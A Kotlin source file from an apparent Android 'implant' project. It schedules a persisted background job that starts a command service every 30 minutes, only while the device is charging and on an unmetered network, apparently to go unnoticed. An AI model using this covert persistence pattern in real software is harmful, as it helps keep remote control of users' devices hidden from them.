package com.cooperthecoder.implant.command.jobs

import android.util.Log
import com.cooperthecoder.implant.command.CommandService
import com.evernote.android.job.Job
import com.evernote.android.job.JobRequest
import java.util.concurrent.TimeUnit


class StartCommandServiceJob : Job() {

    companion object {
        val JOB_NAME: String = StartCommandServiceJob::class.java.name
        val TAG = JOB_NAME

        fun schedule() {
            // Do this plugged in on an unmetered network when the device is idle.
            JobRequest.Builder(JOB_NAME)
                    .setRequiredNetworkType(JobRequest.NetworkType.UNMETERED)
                    .setPeriodic(TimeUnit.MINUTES.toMillis(30))
                    .setRequiresCharging(true)
                    .setRequirementsEnforced(true)
                    .setPersisted(true)
                    .build()
                    .schedule()
        }
    }

    override fun onRunJob(params: Params): Result {
        val intent = CommandService.intent(context)
        context.startService(intent)
        Log.d(TAG, "CommandService started.")
        return Result.SUCCESS
    }

}